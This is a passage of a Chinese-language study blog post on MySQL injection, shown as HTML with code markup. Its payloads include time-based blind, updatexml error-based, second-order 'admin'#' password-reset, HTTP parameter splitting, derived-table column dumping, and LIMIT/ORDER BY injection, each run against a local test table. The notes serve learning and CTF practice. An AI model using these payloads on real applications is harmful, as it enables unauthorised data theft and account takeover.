<span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*时间盲注*/</span>
<span class="token keyword">update</span> test <span class="token keyword">set</span> name <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">or</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span><span class="token string">''</span> <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token keyword">update</span> test <span class="token keyword">set</span> name <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">or</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span><span class="token string">''</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>从数据库取出的数据完全信任，在存进数据库的时候注入恶意代码</p>
<p>在注册账号时可以恶意注入一些sql语句 然后在重置密码的时候没有对已经在数据库的数据进行过滤导致可以在没有密码的情况下恶意修改某些账号的密码 比如这样可以注册admin’#的账户来修改admin的密码</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">update</span> users <span class="token keyword">set</span> password <span class="token operator">=</span> <span class="token string">'&amp;pass'</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token comment" spellcheck="true">#' and password = '$curr_pass'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h3><p>在注入点只允许注册数字 用16进制绕过</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> demo <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token number">0x312d3520756e696f6e2073656c65637420312c3</span>
<span class="token number">22c33</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Query OK<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">row</span> affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> demo<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+------------------------+------+</span>
<span class="token operator">|</span> name  <span class="token operator">|</span> password               <span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+------------------------+------+</span>
<span class="token operator">|</span> admin <span class="token operator">|</span> admin888               <span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">|</span> user1 <span class="token operator">|</span> pass2                  <span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span>
<span class="token operator">|</span> user2 <span class="token operator">|</span> pass3                  <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">|</span> root  <span class="token operator">|</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+------------------------+------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>取出数据库里的内容后再进行拼接，1-5&#x3D;-4已经不是字段里面可以弱类型的内容了所以不会显示而显示后面union select的内容</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> demo <span class="token keyword">where</span> password <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+----------+------+</span>
<span class="token operator">|</span> name <span class="token operator">|</span> password <span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+----------+------+</span>
<span class="token operator">|</span> <span class="token number">1</span>    <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+----------+------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token keyword">warnings</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="hpf-http分割注入"><a href="#hpf-http分割注入" class="headerlink" title="hpf http分割注入"></a>hpf http分割注入</h2><ul>
<li><p>where子句后执行任意不存在函数可以爆出数据库</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> www<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1305</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: <span class="token keyword">FUNCTION</span> test<span class="token punctuation">.</span>www does <span class="token operator">not</span> exist
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
<p>要求同时比对username和password 各自限制一部分</p>
<pre class="line-numbers language-sql"><code class="language-sql">$SQL <span class="token operator">=</span> <span class="token string">"select * from test where username='$input1' and password = '$input2'"</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>payload:</p>
<pre class="line-numbers language-sql"><code class="language-sql">username<span class="token operator">=</span> <span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token comment" spellcheck="true">/*&amp;password=*/</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1
select * from test where username='</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token comment" spellcheck="true">/*' and password = '*/</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="已知表名不知字段名直接爆数据"><a href="#已知表名不知字段名直接爆数据" class="headerlink" title="已知表名不知字段名直接爆数据"></a>已知表名不知字段名直接爆数据</h2><p>思想是通过选取派生表让我们的字段名可控，然后联合查询表里的所有内容</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*用join连接绕过逗号*/</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*引入test表*/</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+-------+------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> <span class="token number">2</span>     <span class="token operator">|</span> <span class="token number">3</span>    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+-------+------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> <span class="token number">2</span>     <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">|</span> admin <span class="token operator">|</span> admin <span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">|</span> root  <span class="token operator">|</span> root  <span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+-------+------+</span>
<span class="token number">3</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">d</span><span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span>
<span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">)</span><span class="token number">d</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*将上面的结果再作为一个派生表，用d.2和limit,offset访问字段的内容*/</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+</span>
<span class="token operator">|</span> <span class="token number">2</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+</span>
<span class="token operator">|</span> admin <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">d</span><span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span>
<span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">)</span><span class="token number">d</span> li
mit <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">f</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> name  <span class="token operator">|</span> password <span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> admin <span class="token operator">|</span> <span class="token number">0</span>        <span class="token operator">|</span>    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">/*也可以用盲注*/</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">d</span><span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> fro
m <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">)</span><span class="token number">d</span> <span class="token keyword">limit</span>
 <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> name  <span class="token operator">|</span> password <span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> admin <span class="token operator">|</span> admin    <span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>mysql select语句执行顺序<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linjiqin/p/5509547.html">原文404了，引用一下别人的吧</a><br>mysql 5.x的select语法</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>
     <span class="token punctuation">[</span><span class="token keyword">ALL</span> <span class="token operator">|</span> <span class="token keyword">DISTINCT</span> <span class="token operator">|</span> <span class="token keyword">DISTINCTROW</span> <span class="token punctuation">]</span>
       <span class="token punctuation">[</span>HIGH_PRIORITY<span class="token punctuation">]</span>
       <span class="token punctuation">[</span>STRAIGHT_JOIN<span class="token punctuation">]</span>
       <span class="token punctuation">[</span>SQL_SMALL_RESULT<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_BIG_RESULT<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_BUFFER_RESULT<span class="token punctuation">]</span>
       <span class="token punctuation">[</span>SQL_CACHE <span class="token operator">|</span> SQL_NO_CACHE<span class="token punctuation">]</span> <span class="token punctuation">[</span>SQL_CALC_FOUND_ROWS<span class="token punctuation">]</span>
     select_expr <span class="token punctuation">[</span><span class="token punctuation">,</span> select_expr <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">FROM</span> table_references
     <span class="token punctuation">[</span><span class="token keyword">WHERE</span> where_condition<span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">GROUP</span> <span class="token keyword">BY</span> {col_name <span class="token operator">|</span> expr <span class="token operator">|</span> position}
       <span class="token punctuation">[</span><span class="token keyword">ASC</span> <span class="token operator">|</span> <span class="token keyword">DESC</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token keyword">WITH ROLLUP</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">HAVING</span> where_condition<span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> {col_name <span class="token operator">|</span> expr <span class="token operator">|</span> position}
       <span class="token punctuation">[</span><span class="token keyword">ASC</span> <span class="token operator">|</span> <span class="token keyword">DESC</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> {<span class="token punctuation">[</span><span class="token keyword">offset</span><span class="token punctuation">,</span><span class="token punctuation">]</span> row_count <span class="token operator">|</span> row_count <span class="token keyword">OFFSET</span> <span class="token keyword">offset</span>}<span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">PROCEDURE</span> procedure_name<span class="token punctuation">(</span>argument_list<span class="token punctuation">)</span><span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'file_name'</span> export_options
       <span class="token operator">|</span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">'file_name'</span>
       <span class="token operator">|</span> <span class="token keyword">INTO</span> var_name <span class="token punctuation">[</span><span class="token punctuation">,</span> var_name<span class="token punctuation">]</span><span class="token punctuation">]</span>
     <span class="token punctuation">[</span><span class="token keyword">FOR</span> <span class="token keyword">UPDATE</span> <span class="token operator">|</span> <span class="token keyword">LOCK</span> <span class="token operator">IN</span> <span class="token keyword">SHARE MODE</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mysql中在order by前面可以使用union关键字</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> test <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> name  <span class="token operator">|</span> password <span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">|</span> admin <span class="token operator">|</span> admin    <span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">-------+----------+------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">></span> <span class="token number">0</span>  <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token keyword">limit</span> <span class="token number">1</span>  <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span>
ERROR <span class="token number">1221</span> <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Incorrect <span class="token keyword">usage</span> <span class="token keyword">of</span> <span class="token keyword">UNION</span> <span class="token operator">and</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用procedure analyse进行报错注入</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">></span> <span class="token number">0</span>  <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1105</span> <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">'~5.5.53~'</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">></span> <span class="token number">0</span>  <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token operator">in</span> your SQL syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that
corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'select version()),0x7e),1),1)'</span> at line <span class="token number">1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是这里面解析不了select子句，Daedalus说是mysql版本问题，玩不了了</p>
<h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><p>报错</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1105</span> <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">'~root@localhost~'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>时间盲注</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> id <span class="token keyword">from</span> test <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token operator">|</span> id   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span>
